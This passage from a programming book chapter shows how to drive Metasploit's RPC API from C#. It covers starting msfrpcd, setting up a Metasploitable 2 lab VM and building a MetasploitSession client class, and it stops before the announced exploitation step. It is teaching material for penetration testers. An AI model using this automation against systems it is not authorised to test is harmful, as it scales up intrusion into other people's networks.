<html><head></head><body>
<p id="filepos761301" class="calibre_"><span class="calibre6"><span class="bold">
</span></span><span class="calibre1"><span class="bold">11</span></span><br class="calibre5"/><span class="calibre6"><span class="bold">AUTOMATING METASPLOIT</span></span></p><p class="calibre_12"><img src="images/00010.jpg" class="calibre_13"/></p><p class="calibre_6">Metasploit is the de facto open source penetration-testing framework. Written in Ruby, Metasploit is both an exploit database and a framework for exploit development and penetration testing. But many of Metasploit’s most powerful features, such as its remote procedure call (RPC) API, are often overlooked.</p><p class="calibre_6">This chapter introduces you to the Metasploit RPC and shows you how to use it to programmatically drive the Metasploit Framework. You’ll learn how to use the RPC to automate Metasploit to exploit Metasploitable 2, an intentionally vulnerable Linux machine designed for learning how to use Metasploit. Red teams or offensive security professionals should note that many pieces of tedious work can be automated, thus freeing up time to focus more on the intricate or nonobvious vulnerabilities. With an API-driven Metasploit Framework at your fingertips, you’ll be able to automate tedious tasks such as host discovery and even network exploitation in a scaleable way.</p><p id="filepos762659" class="calibre_10"><span class="calibre3"><span class="bold"> Running the RPC Server</span></span></p><p class="calibre_11">Since we set up Metasploit in <a href="index_split_009.html#filepos344540">Chapter 4</a>, I won’t go over how to set it up again here. <a href="#filepos763310">Listing 11-1</a> shows what you need to enter in order to run the RPC server.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">msfrpcd -U </span></span><span class="calibre4"><span class="italic"><span class="bold">username</span></span></span><span class="calibre4"><span class="bold"> -P </span></span><span class="calibre4"><span class="italic"><span class="bold">password</span></span></span><span class="calibre4"><span class="bold"> -S -f</span></span><span class="calibre4">
</span><a id="filepos763310"/><span class="calibre4"><span class="italic">Listing 11-1: Running the RPC server</span></span></blockquote><p class="calibre_6">The <span class="calibre4">-U</span> and <span class="calibre4">-P</span> arguments stand for the username and password that authenticate the RPC. You can use whatever you want for the username or password, but you will need the credentials when we write the C# code. The <span class="calibre4">-S</span> argument disables SSL. (Self-signed certificates make things a bit more complicated, so we’ll ignore them for now.) Finally, <span class="calibre4">-f</span> tells the RPC interface to run in the foreground to make the RPC process easier to monitor.</p><p class="calibre_6">To use the new RPC interface that is running, either start a new terminal or restart <span class="calibre4">msfrpcd</span> without the <span class="calibre4">-f</span> option (which starts <span class="calibre4">msfrpcd</span> in the background) and then use Metasploit’s <span class="calibre4">msfrpc</span> client to connect to the RPC listener that was just started and begin issuing calls. Be forewarned, though: the <span class="calibre4">msfrpc</span> client is rather cryptic—it’s difficult to read and has unintuitive error messages. <a href="#filepos765738">Listing 11-2</a> shows the process of authenticating with the <span class="calibre4">msfrpcd</span> server using the <span class="calibre4">msfrpc</span> client shipped with Metasploit.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">msfrpc</span></span><span class="calibre4"> ➊</span><span class="calibre4"><span class="bold">-U</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic"><span class="bold">username</span></span></span><span class="calibre4"> ➋</span><span class="calibre4"><span class="bold">-P</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic"><span class="bold">password</span></span></span><span class="calibre4"> ➌</span><span class="calibre4"><span class="bold">-S</span></span><span class="calibre4"> ➍</span><span class="calibre4"><span class="bold">-a 127.0.0.1</span></span><br class="calibre5"/><span class="calibre4">[*] The 'rpc' object holds the RPC client interface</span><br class="calibre5"/><span class="calibre4">[*] Use rpc.call('group.command') to make RPC calls</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">&gt;&gt; ➎</span><span class="calibre4"><span class="bold">rpc.call('auth.login', '</span></span><span class="calibre4"><span class="italic"><span class="bold">username</span></span></span><span class="calibre4"><span class="bold">', '</span></span><span class="calibre4"><span class="italic"><span class="bold">password</span></span></span><span class="calibre4"><span class="bold">')</span></span><br class="calibre5"/><span class="calibre4">=&gt; {"result"=&gt;"success", "token"=&gt;"TEMPZYFJ3CWFxqnBt9AfjvofOeuhKbbx"}</span></blockquote><p id="filepos765738" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-2: Using the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">msfrpc</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">client to authenticate with the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">msfrpcd</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">server</span></span></p><p class="calibre_6">To connect to the RPC listener with <span class="calibre4">msfrpcd</span>, we pass a few arguments to <span class="calibre4">msfrpcd</span>. The username and password we set on the RPC listener for authentication are passed with <span class="calibre4">-U</span> ➊ and <span class="calibre4">-P</span> ➋, respectively. The <span class="calibre4">-S</span> argument ➌ tells <span class="calibre4">msfrpc</span> to not use SSL when connecting to the listener, and the <span class="calibre4">-a</span> argument ➍ is the IP address to which the listener connects. Since we started our <span class="calibre4">msfrpcd</span> instance without specifying an IP address to listen on, the default address of 127.0.0.1 is used.</p><p class="calibre_6">Once connected to the RPC listener, we can use <span class="calibre4">rpc.call()</span> ➎ to call API methods that are available. We are going to test with the <span class="calibre4">auth.login</span> remote procedure method because it will use the same username and password we passed as the arguments. When you call <span class="calibre4">rpc.call()</span>, the RPC method and arguments are packed into a serialized MSGPACK blob that is sent to the RPC server using an HTTP post request with a content type of <span class="calibre4">binary/message-pack</span>. These are important points to note because we need to do the same things in C# to communicate with the RPC server.</p><p class="calibre_6">We already have a lot of experience with the HTTP libraries, but MSGPACK serialization is certainly not a typical HTTP serialization format (you’re more likely to see XML or JSON). MSGPACK allows C# to read and respond with complex data from the Ruby RPC server very efficiently, just as using JSON or XML would have been a potential bridge for the two languages. As we work with MSGPACK, it should become clearer how MSGPACK serialization works.</p><p id="filepos767991" class="calibre_10"><span class="calibre3"><span class="bold">Installing Metasploitable</span></span></p><p class="calibre_11">Metasploitable 2 has a specific vulnerability that is particularly simple to exploit: a backdoored Unreal IRC server. This is a great example of a vulnerability with a Metasploit module that we can cut our teeth on with the Metasploit RPC. You can download Metasploitable 2 from either Rapid7 at <a href="https://information.rapid7.com/metasploitable-download.html"><span class="italic">https://information.rapid7.com/metasploitable-download.html</span></a> or VulnHub at <a href="https://www.vulnhub.com/"><span class="italic">https://www.vulnhub.com/</span></a>.</p><p class="calibre_6">Metasploitable is shipped as a VMDK image in a ZIP archive, so installing it into VirtualBox isn’t completely straightforward. After unzipping the Metasploitable VM and opening VirtualBox, follow these instructions:</p><div class="calibre_19"> </div><ol class="calibre_20"><li value="1" class="calibre_21"><p class="calibre_6">Click the <span class="bold">New</span> button in the top-left corner of VirtualBox to open the wizard.</p></li><li value="2" class="calibre_21"><p class="calibre_6">Create a new VM named <span class="bold">Metasploitable</span>.</p></li><li value="3" class="calibre_21"><p class="calibre_6">Give it a Type of <span class="bold">Linux</span> and leave the Version as <span class="bold">Ubuntu (64-bit)</span>; then click <span class="bold">continue</span> or <span class="bold">Next</span>.</p></li><li value="4" class="calibre_21"><p class="calibre_6">Allocate between <span class="bold">512 MB</span> and <span class="bold">1 GB RAM</span> to the VM and then click <span class="bold">continue</span> or <span class="bold">Next</span>.</p></li><li value="5" class="calibre_21"><p class="calibre_6">In the Hard Disk dialog, select the <span class="bold">Use an existing virtual hard disk file</span> option.</p></li><li value="6" class="calibre_21"><p class="calibre_6">Next to the hard disk drop-down is a small folder icon. Click this and navigate to the folder into which you unzipped Metasploitable.</p></li><li value="7" class="calibre_21"><p class="calibre_6">Select the Metasploitable VMDK file and click <span class="bold">Open</span> in the bottom right of the dialog.</p></li><li value="8" class="calibre_21"><p class="calibre_6">In the Hard Disk dialog, click the <span class="bold">Create</span> button. This should close the VM wizard.</p></li><li value="9" class="calibre_21"><p class="calibre_6">Start the new VM by clicking the <span class="bold">Start</span> button at the top of the VirtualBox window.</p></li></ol><p class="calibre_24">Once the virtual appliance has booted up, we need its IP address. To get the IP, after the appliance has booted up, log in with the credentials <span class="calibre4">msfadmin</span>/<span class="calibre4">msfadmin</span> and then enter <span class="calibre4"><span class="bold">ifconfig</span></span> at the bash shell to have the IP configuration printed to the screen.</p><p id="filepos771023" class="calibre_10"><span class="calibre3"><span class="bold">Getting the MSGPACK Library</span></span></p><p class="calibre_11">We need to get one more thing before we can start writing the code to drive our Metasploit instance using C#: the MSGPACK library. This library is not part of the core C# libraries, so we have to use NuGet, which is a .NET package manager like pip (Python) or gem (Ruby), to install the correct library we want to use. By default, Visual Studio and Xamarin Studio have great NuGet package management support. However, the free MonoDevelop available for Linux distros isn’t as up-to-date with the NuGet features as these other IDEs. Let’s go over installing the correct MSGPACK library in MonoDevelop. It’s a bit roundabout, but using Xamarin Studio and Visual Studio should be much simpler because they don’t require you to use a specific version of the MSGPACK library.</p><p id="filepos771950" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Installing the NuGet Package Manager for MonoDevelop</span></span></span></p><p class="calibre_11">First, you may need to install the NuGet add-in using the Add-in Manager in MonoDevelop. If so, open MonoDevelop and then follow these steps to install the NuGet package manager:</p><div class="calibre_19"> </div><ol class="calibre_20"><li value="1" class="calibre_21"><p class="calibre_6">Go to the <span class="bold">Tools</span> ▸ <span class="bold">Add-in Manager</span> menu item.</p></li><li value="2" class="calibre_21"><p class="calibre_6">Click the <span class="bold">Gallery</span> tab.</p></li><li value="3" class="calibre_21"><p class="calibre_6">In the Repository drop-down list, select <span class="bold">Manage Repositories</span>.</p></li><li value="4" class="calibre_21"><p class="calibre_6">Click the <span class="bold">Add</span> button to add a new repository.</p></li><li value="5" class="calibre_21"><p class="calibre_6">In the Add New Repository dialog, ensure <span class="bold">Register an on-line repository</span> is selected. In the URL text box, enter the following URL: http://mrward.github.com/monodevelop-nuget-addin-repository/4.0/main.mrep</p></li><li value="6" class="calibre_21"><p class="calibre_6">Click <span class="bold">OK</span> and close the Add New Repository dialog by clicking <span class="bold">Close</span>.</p></li></ol><p class="calibre_24">With the new repository installed, you can install the NuGet package manager easily. After closing the repository dialog, you should be back on the Gallery tab in the Add-in Manager. In the top-right corner of the Add-in Manager is a text box for searching possible add-ins to install. Enter <span class="calibre4"><span class="bold">nuget</span></span> into this box; it should filter the packages to show you the NuGet package manager. Select the NuGet extension and then click the <span class="bold">Install</span> button (see <a href="#filepos774094">Figure 11-1</a>).</p><p class="calibre_22"><img src="images/00001.jpg" class="calibre_38"/></p><p id="filepos774094" class="calibre_15"><span class="calibre4"><span class="italic">Figure 11-1: The MonoDevelop Add-in Manager installing NuGet</span></span></p><p id="filepos774228" class="calibre_10"><span class="calibre3"><span class="bold">
</span></span><span class="calibre3"><span class="italic"><span class="bold">Installing the MSGPACK Library</span></span></span></p><p class="calibre_11">Now that the NuGet package manager is installed, we can install our MSGPACK library. There is a small hitch, though. The best version of the MSGPACK library to install for MonoDevelop is 0.6.8 (for compatibility purposes), but the NuGet manager in MonoDevelop doesn’t allow us to specify a version and will try to install the latest version. We need to add a <span class="italic">packages.config</span> file manually to the project that specifies the version of the library we want, as shown in <a href="#filepos775476">Listing 11-3</a>. Right-click the Metasploit project in the Solution Explorer in MonoDevelop, Xamarin Studio, or Visual Studio. From the menu that appears, select <span class="bold">Add</span> ▸ <span class="bold">New File</span> and add a new file called <span class="italic">packages.config</span>.</p><blockquote class="calibre_14"><span class="calibre4">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br class="calibre5"/><span class="calibre4">&lt;packages&gt;</span><br class="calibre5"/><span class="calibre4"> &lt;package id="MsgPack.Cli" version="0.6.8" targetFramework="net45" /&gt;</span><br class="calibre5"/><span class="calibre4">&lt;/packages&gt; </span><a id="filepos775476"/><span class="calibre4"><span class="italic">Listing 11-3: The</span></span><span class="calibre4"> packages.config </span><span class="calibre4"><span class="italic">file specifying the correct version of the MsgPack.Cli library</span></span></blockquote><p class="calibre_6">After creating the <span class="italic">packages.config</span> file, restart MonoDevelop and open the project you created to run the Metasploit code we’ll soon write. You should now be able to right-click the project references and click the <span class="bold">Restore NuGet Packages</span> menu item, which will ensure the packages in the <span class="italic">packages.config</span> file are installed with the correct versions.</p><p id="filepos776090" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Referencing the MSGPACK Library</span></span></span></p><p class="calibre_11">With the correct version of the MSGPACK library installed, we can now add it as a reference to the project so we can start writing some code. Usually NuGet would handle this for us, but this is a small bug in MonoDevelop that we must work around. Right-click the <span class="bold">References</span> folder in your MonoDevelop solution pane and select <span class="bold">Edit References...</span> (see <a href="#filepos776770">Figure 11-2</a>).</p><p class="calibre_22"><img src="images/00029.jpg" class="calibre_39"/></p><p id="filepos776770" class="calibre_15"><span class="calibre4"><span class="italic">Figure 11-2: The Edit References... menu item in the solution pane</span></span></p><p class="calibre_6">The Edit References dialog should come up with a few tabs available, as shown in <a href="#filepos777457">Figure 11-3</a>. You want to select the <span class="bold">.Net Assembly</span> tab and then navigate to the <span class="italic">MsgPack.dll</span> assembly in the <span class="italic">packages</span> folder in the root of the project. This <span class="italic">packages</span> folder was created by NuGet automatically when you downloaded the MSGPACK library.</p><p class="calibre_22"><img src="images/00003.jpg" class="calibre_40"/></p><p id="filepos777457" class="calibre_15"><span class="calibre4"><span class="italic">Figure 11-3: The Edit References dialog</span></span></p><p class="calibre_6">After finding the MsgPack.dll library, select it and click <span class="bold">OK</span> in the bottom-right corner of the dialog. This should add the MsgPack.dll library to your project so that you can begin using the classes and referencing the library in your C# source files.</p><p id="filepos777877" class="calibre_10"><span class="calibre3"><span class="bold">Writing the MetasploitSession Class</span></span></p><p class="calibre_11">Now we need to build a <span class="calibre4">MetasploitSession</span> class to communicate with the RPC server, as shown in <a href="#filepos779686">Listing 11-4</a>.</p><blockquote class="calibre_14"><span class="calibre4">public class MetasploitSession : IDisposable</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> string _host;</span><br class="calibre5"/><span class="calibre4"> string _token;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public MetasploitSession(➊string username, string password, string host)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> _host = host;</span><br class="calibre5"/><span class="calibre4"> _token = null;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> Dictionary&lt;object, object&gt; response = this.➋Authenticate(username, password);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> ➌bool loggedIn = !response.ContainsKey("error");</span><br class="calibre5"/><span class="calibre4"> if (!loggedIn)</span><br class="calibre5"/><span class="calibre4"> ➍throw new Exception(response["error_message"] as string);</span><br class="calibre5"/><span class="calibre4"> ➎if ((response["result"] as string) == "success")</span><br class="calibre5"/><span class="calibre4"> _token = response["token"] as string;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public string ➏Token</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> get { return _token; }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; Authenticate(string username, string password)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return this.➐Execute("auth.login", username, password);</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos779686" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-4: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MetasploitSession</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">class constructor,</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Token</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">property, and</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Authenticate()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method</span></span></p><p class="calibre_6">The <span class="calibre4">MetasploitSession</span> constructor takes three arguments, as shown at ➊: the username and password to authenticate with and the host to connect to. We call <span class="calibre4">Authenticate()</span> ➋ with the supplied username and password and then test for authentication by checking whether the response contains an error ➌. If the authentication fails, an exception is thrown ➍. If authentication succeeds, we assign the <span class="calibre4">_token</span> variable with the value of the authentication token returned by the RPC ➎ and make the <span class="calibre4">Token</span> ➏ public. The <span class="calibre4">Authenticate()</span> method calls the <span class="calibre4">Execute()</span> method ➐, passing in <span class="calibre4">auth.login</span> as the RPC method along with the username and password.</p><p id="filepos781017" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Creating the Execute() Method for HTTP Requests and Interacting with MSGPACK</span></span></span></p><p class="calibre_11">The <span class="calibre4">Execute()</span> method shown in <a href="#filepos783611">Listing 11-5</a> does the bulk of the work of the RPC library, creating and sending HTTP requests and serializing the RPC methods and arguments into MSGPACK.</p><blockquote class="calibre_14"><span class="calibre4">public Dictionary&lt;object, object&gt; Execute(string method, params object[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> if ➊(method != "auth.login" &amp;&amp; string.IsNullOrEmpty(_token))</span><br class="calibre5"/><span class="calibre4"> throw new Exception("Not authenticated.");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> HttpWebRequest request = (HttpWebRequest)WebRequest.Create(_host);</span><br class="calibre5"/><span class="calibre4"> request.ContentType = ➋"binary/message-pack";</span><br class="calibre5"/><span class="calibre4"> request.Method = "POST";</span><br class="calibre5"/><span class="calibre4"> request.KeepAlive = true;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> using (Stream requestStream = request.GetRequestStream())</span><br class="calibre5"/><span class="calibre4"> using (Packer msgpackWriter = ➌Packer.Create(requestStream))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> bool sendToken = (!string.IsNullOrEmpty(_token) &amp;&amp; method != "auth.login");</span><br class="calibre5"/><span class="calibre4"> msgpackWriter.➍PackArrayHeader(1 + (sendToken ? 1 : 0) + args.Length);</span><br class="calibre5"/><span class="calibre4"> msgpackWriter.Pack(method);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (sendToken)</span><br class="calibre5"/><span class="calibre4"> msgpackWriter.Pack(_token);</span><br class="calibre5"/><span class="calibre4"> ➎foreach (object arg in args)</span><br class="calibre5"/><span class="calibre4"> msgpackWriter.Pack(arg);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> ➏using (MemoryStream mstream = new MemoryStream())</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> using (WebResponse response = request.GetResponse())</span><br class="calibre5"/><span class="calibre4"> using (Stream rstream = response.GetResponseStream())</span><br class="calibre5"/><span class="calibre4"> rstream.CopyTo(mstream);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> mstream.Position = 0;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> MessagePackObjectDictionary resp =</span><br class="calibre5"/><span class="calibre4"> Unpacking.➐UnpackObject(mstream).AsDictionary();</span><br class="calibre5"/><span class="calibre4"> return MessagePackToDictionary(resp);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos783611" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-5: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MetasploitSession</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">class’s</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Execute()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method</span></span></p><p class="calibre_6">At ➊, we check whether <span class="calibre4">auth.login</span> was passed as the RPC method, which is the only RPC method that doesn’t require authentication. If the method is not <span class="calibre4">auth.login</span> and we have no authentication token set, we throw an exception because the command passed to be executed will fail without authentication.</p><p class="calibre_6">Once we know that we have the authentication necessary to make the API HTTP request, we set the <span class="calibre4">ContentType</span> to <span class="calibre4">binary/message-pack</span> ➋ so that the API knows we are sending it MSGPACK data in the HTTP body. We then create a <span class="calibre4">Packer</span> class by passing the HTTP request stream to the <span class="calibre4">Packer.Create()</span> method ➌. The <span class="calibre4">Packer</span> class (defined in the MsgPack.Cli library) is a real time-saver that allows us to write our RPC method and arguments to the HTTP request stream. We’ll use the various packing methods in the <span class="calibre4">Packer</span> class to serialize and write the RPC methods and arguments to the request stream.</p><p class="calibre_6">We write the total number of pieces of information we are writing to the request stream using <span class="calibre4">PackArrayHeader()</span> ➍. For example, the <span class="calibre4">auth.login</span> method has three pieces of information: the method name and the two arguments <span class="calibre4">username</span> and <span class="calibre4">password</span>. We would first write the number <span class="calibre4">3</span> onto the stream. Then we would write the strings <span class="calibre4">auth.login</span>, <span class="calibre4">username</span>, and <span class="calibre4">password</span> to the stream using <span class="calibre4">Pack</span>. We’ll use this general process of serializing and sending the API method and arguments as the HTTP body to send our API requests to the Metasploit RPC.</p><p class="calibre_6">Having written the RPC method to the request stream, we write the authentication token if necessary. We then move on to packing the RPC method arguments in a <span class="calibre4">foreach</span> loop ➎ to finish the HTTP request making the API call.</p><p class="calibre_6">The rest of the <span class="calibre4">Execute()</span> method reads the HTTP response that is serialized with MSGPACK and converts it into C# classes that we can use. We first read the response into a byte array using a <span class="calibre4">MemoryStream()</span> ➏. We then deserialize the response with <span class="calibre4">UnpackObject()</span> ➐, passing the byte array as the only argument and returning the object as a MSGPACK dictionary. This MSGPACK dictionary isn’t exactly what we want, though. The values contained in the dictionary—such as strings—all need to be converted to their C# class counterparts so that we can easily use them. To do this, we pass the MSGPACK dictionary to the <span class="calibre4">MessagePackToDictionary()</span> method (discussed in the next section).</p><p id="filepos787028" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Transforming Response Data from MSGPACK</span></span></span></p><p class="calibre_11">The next few methods are mainly used to transform the API responses from Metasploit in the MSGPACK format into C# classes we can use more easily.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Converting an MSGPACK Object to a C# Dictionary with MessagePackToDictionary()</span></span></p><p class="calibre_11">The <span class="calibre4">MessagePackToDictionary()</span> method shown in <a href="#filepos788874">Listing 11-6</a> was introduced at the end of <a href="#filepos783611">Listing 11-5</a> in the <span class="calibre4">Execute()</span> method. It accepts a <span class="calibre4">MessagePackObjectDictionary</span> and converts it into a C# dictionary (a class for holding key/value pairs), which is a close equivalent to a Ruby or Python hash.</p><blockquote class="calibre_14"><span class="calibre4">Dictionary&lt;object,object&gt; MessagePackToDictionary(➊MessagePackObjectDictionary dict)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> Dictionary&lt;object, object&gt; newDict = new ➋Dictionary&lt;object, object&gt;();</span><br class="calibre5"/><span class="calibre4"> foreach (var pair in ➌dict)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> object newKey = ➍GetObject(pair.Key);</span><br class="calibre5"/><span class="calibre4"> if (pair.Value.IsTypeOf&lt;MessagePackObjectDictionary&gt;() == true)</span><br class="calibre5"/><span class="calibre4"> newDict[newKey] = MessagePackToDictionary(pair.Value.AsDictionary());</span><br class="calibre5"/><span class="calibre4"> else</span><br class="calibre5"/><span class="calibre4"> newDict[newKey] = ➎GetObject(pair.Value);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> ➏return newDict;</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos788874" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-6: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MessagePackToDictionary()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method</span></span></p><p class="calibre_6">The <span class="calibre4">MessagePackToDictionary()</span> method takes a single argument ➊, the MSGPACK dictionary we want to convert to a C# dictionary. Once we’ve created the C# dictionary ➋, we’ll put our converted MSGPACK objects in it by iterating over each key/value pair from the MSGPACK dictionary passed as the argument to the method ➌. First, we’ll get a C# object for the given key of the current loop iteration ➍, and then we’ll test the corresponding value to determine how best to deal with it. For example, if the value is a dictionary, we introduce recursion into the method by calling <span class="calibre4">MessagePackToDictionary()</span>. Otherwise, if the value isn’t another dictionary, we convert it to its corresponding C# type with <span class="calibre4">GetObject()</span>, which we’ll define later ➎. Finally, we return the new dictionary ➏ with the C# types instead of MSGPACK types.</p><p class="calibre_10"><span class="calibre3"><span class="bold"> Converting an MSGPACK Object to a C# Object with GetObject()</span></span></p><p class="calibre_11"><a href="#filepos791337">Listing 11-7</a> shows how we implement the <span class="calibre4">GetObject()</span> method shown at ➍ in <a href="#filepos788874">Listing 11-6</a>. This method accepts a <span class="calibre4">MessagePackObject</span>, converts it into its C# class, and returns the new object.</p><blockquote class="calibre_14"><span class="calibre4">private object GetObject(MessagePackObject str)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4">➊if (str.UnderlyingType == typeof(byte[]))</span><br class="calibre5"/><span class="calibre4"> return System.Text.Encoding.ASCII.GetString(str.AsBinary());</span><br class="calibre5"/><span class="calibre4"> else if (str.UnderlyingType == typeof(string))</span><br class="calibre5"/><span class="calibre4"> return str.AsString();</span><br class="calibre5"/><span class="calibre4"> else if (str.UnderlyingType == typeof(byte))</span><br class="calibre5"/><span class="calibre4"> return str.AsByte();</span><br class="calibre5"/><span class="calibre4"> else if (str.UnderlyingType == typeof(bool))</span><br class="calibre5"/><span class="calibre4"> return str.AsBoolean();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">➋return null;</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos791337" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-7: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MetasploitSession</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">class’s</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">GetObject()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method</span></span></p><p class="calibre_6">The <span class="calibre4">GetObject()</span> method checks whether an object is one of a certain type, like a string or a Boolean, and returns the object as the C# type if it finds a match. At ➊, we convert any <span class="calibre4">MessagePackObject</span> with an <span class="calibre4">UnderlyingType</span> that is an array of bytes to a string and return the new string. Because some of the “strings” sent from Metasploit are actually just byte arrays, we must convert these byte arrays to strings in the beginning or we’ll need to cast them to strings whenever we want to use them. Casting often is computationally inefficient, so it’s best to just convert all the values up front.</p><p class="calibre_6">The rest of the <span class="calibre4">if</span> statements check for and convert other data types. If we get to the last <span class="calibre4">else if</span> statement and have not been able to return a new object, we return null ➋. This allows us to test whether the conversion to another type was successful. If null is returned, we must find out why we couldn’t convert the <span class="calibre4">MSGPACK</span> object to another C# class.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Cleaning Up the RPC Session with Dispose()</span></span></p><p class="calibre_11">The <span class="calibre4">Dispose()</span> method shown in <a href="#filepos793593">Listing 11-8</a> cleans up our RPC session during garbage collection.</p><blockquote class="calibre_14"><span class="calibre4">public void Dispose()</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> if (this.➊Token != null)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> this.Execute("auth.logout", this.Token);</span><br class="calibre5"/><span class="calibre4"> _token = null;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos793593" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-8: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MetasploitSession</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">class’s</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Dispose()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method</span></span></p><p class="calibre_6"> If our <span class="calibre4">Token</span> property ➊ is not null, we assume we are authenticated, call <span class="calibre4">auth.logout</span> and pass the authentication token as the only argument, and assign null to the local <span class="calibre4">_token</span> variable.</p><p id="filepos794237" class="calibre_10"><span class="calibre3"><span class="bold">Testing the session Class</span></span></p><p class="calibre_11">Now can test our <span class="calibre4">session</span> class by displaying the version of the RPC (see <a href="#filepos795713">Listing 11-9</a>). With the <span class="calibre4">session</span> class working and finished, we can begin really driving Metasploit and move on to exploiting Metasploitable automatically.</p><blockquote class="calibre_14"><span class="calibre4">public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> string listenAddr = ➊args[0];</span><br class="calibre5"/><span class="calibre4"> using (MetasploitSession session = new ➋MetasploitSession("username",</span><br class="calibre5"/><span class="calibre4"> "password", "http://"+listenAddr+":55553/api"))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrEmpty(session.Token))</span><br class="calibre5"/><span class="calibre4"> throw new Exception("Login failed. Check credentials");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> Dictionary&lt;object, object&gt; version = session.➌Execute("core.version");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> Console.WriteLine(➍"Version: " + version["version"]);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(➎"Ruby: " + version["ruby"]);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(➏"API: " + version["api"]);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos795713" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-9: Testing the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MetasploitSession</span></span><span class="calibre4">
